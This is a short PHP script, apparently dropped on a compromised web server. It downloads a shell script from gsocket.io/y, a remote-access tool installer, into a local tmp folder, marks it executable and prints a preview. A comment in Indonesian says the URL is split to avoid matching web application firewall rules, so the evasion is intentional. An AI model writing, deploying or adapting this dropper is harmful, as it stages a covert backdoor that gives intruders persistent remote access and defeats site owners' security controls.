<?php
error_reporting(E_ALL); ini_set('display_errors', 1);
set_time_limit(60);

$dir = __DIR__ . '/tmp';
if (!is_dir($dir)) { mkdir($dir, 0700, true); }
$dst = $dir . '/y.sh';

$host = 'gsocket.io';
$path = '/y';
$url  = 'https://' . $host . $path; // dipecah supaya tidak ketangkep WAF regex

echo "<pre>Saving to: $dst\nURL: $url\n</pre>";

if (!function_exists('curl_init')) {
  die("<pre>cURL PHP missing</pre>");
}

$ch = curl_init($url);
curl_setopt_array($ch, [
  CURLOPT_RETURNTRANSFER => true,
  CURLOPT_FOLLOWLOCATION => true,
  CURLOPT_TIMEOUT => 30,
  CURLOPT_SSL_VERIFYPEER => true,
  CURLOPT_SSL_VERIFYHOST => 2,
  CURLOPT_USERAGENT => 'curl/8.0'
]);
$body = curl_exec($ch);
$err  = curl_error($ch);
$code = (int)curl_getinfo($ch, CURLINFO_HTTP_CODE);
curl_close($ch);

echo "<pre>HTTP code: $code\ncURL error: " . ($err ?: "(none)") . "</pre>";

if ($body === false || $code < 200 || $code >= 300) {
  exit("<pre>Download FAIL</pre>");
}

if (file_put_contents($dst, $body, LOCK_EX) === false) {
  exit("<pre>Write FAIL to $dst</pre>");
}
chmod($dst, 0700);

$preview = htmlspecialchars(implode("", array_slice(file($dst), 0, 30)));
echo "<pre>Saved. Preview (first 30 lines):\n$preview\n</pre>";
